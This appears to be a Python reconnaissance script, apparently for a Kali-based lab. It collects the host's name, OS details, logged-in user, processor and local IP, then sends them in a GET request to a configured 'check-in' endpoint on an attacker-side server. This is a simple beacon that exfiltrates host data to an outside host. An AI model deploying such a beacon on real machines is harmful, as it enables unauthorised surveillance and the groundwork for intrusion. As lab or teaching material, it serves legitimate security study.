import socket
import platform
import os
import requests
import sys

# ========================================================
# CONFIGURATION
# Change this to the IP address of your Kali machine
SERVER_IP = '192.168.1.100' 
# The endpoint on your Kali server (e.g., 'checkin')
ENDPOINT = 'checkin' 
# ========================================================

def get_host_info():
    """
    Gathers essential information from the host system.
    """
    info = {}
    
    # Basic System Info
    info['hostname'] = socket.gethostname()
    info['os'] = platform.system()        # e.g., Windows, Linux
    info['os_release'] = platform.release() # e.g., 10, 5.4.0-91
    info['os_version'] = platform.version()
    
    # User and Hardware Info
    try:
        info['user'] = os.getlogin()
    except OSError:
        # Fallback for environments where os.getlogin() fails (like some service accounts)
        info['user'] = os.environ.get('USERNAME', 'N/A') 
        
    info['processor'] = platform.processor()
    
    # Network Info (IP Address)
    try:
        # This grabs the primary local IP address
        info['local_ip'] = socket.gethostbyname(socket.gethostname())
    except socket.error:
        info['local_ip'] = 'N/A'

    return info

def send_data(data):
    """
    Formats the collected data and sends it to the configured HTTP server.
    """
    print("[+] Collecting host information...")
    
    # Format the dictionary into a query string (key=value&key2=value2)
    params = []
    for key, value in data.items():
        # URL encode the value just in case it contains special characters
        params.append(f"{key}={value}")
        
    query_string = "&".join(params)
    target_url = f"http://{SERVER_IP}/{ENDPOINT}?{query_string}"
    
    print(f"[+] Target URL: {target_url}")
    
    try:
        # Execute the GET request
        response = requests.get(target_url, timeout=10)
        
        if response.status_code == 200:
            print("-" * 40)
            print(f"✅ SUCCESS: Data successfully sent!")
            print(f"HTTP Status Code: {response.status_code}")
            print(f"Server Response: {response.text}")
            print("-" * 40)
        else:
            print(f"❌ FAILURE: Failed to send data.")
            print(f"Received HTTP Status Code: {response.status_code}")
            print(f"Server Message: {response.text}")
            
    except requests.exceptions.RequestException as e:
        print("\n" + "=" * 40)
        print(f"🚨 CRITICAL ERROR: Could not connect to server.")
        print(f"Ensure your Kali server is running and accessible at {SERVER_IP}.")
        print(f"Error details: {e}")
        print("=" * 40)
        sys.exit(1)

if __name__ == "__main__":
    host_data = get_host_info()
    # Optional: Print the data locally before sending (good for debugging)
    print("\n--- Collected Host Data ---")
    for k, v in host_data.items():
        print(f"{k.upper()}: {v}")
    print("---------------------------\n")
    
    send_data(host_data)
